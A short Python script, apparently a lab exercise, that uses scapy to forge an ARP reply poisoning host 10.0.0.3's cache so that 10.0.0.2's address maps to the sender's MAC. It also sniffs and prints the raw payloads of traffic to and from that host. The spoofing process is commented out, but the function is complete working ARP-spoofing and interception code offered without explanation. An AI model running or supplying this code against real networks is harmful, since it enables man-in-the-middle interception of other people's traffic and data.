from scapy.all import Ether, sendp, ARP, get_if_hwaddr, sniff, Raw, TCP
from multiprocessing import Process
import socket

def handle_packet(packet):
    print(packet.summary())
    try:
        print(packet[Raw].load)
    except:
        print("waaaa\n")

def listener():
    recvpacket = sniff(count=100, filter="ip host 10.0.0.3", prn=handle_packet)


def arp_forge():
    iface = "eth0"
    my_mac = get_if_hwaddr(iface)

    eth = Ether(src=my_mac ,type=0x0806)
    arp = ARP(op=2, hwsrc=my_mac, psrc="10.0.0.2", pdst="10.0.0.3")
    pckt = eth / arp
    sendp(pckt)

p1= Process(target=listener)
# p2= Process(target=arp_forge)
p1.start()
# p2.start()
p1.join()
# p2.join()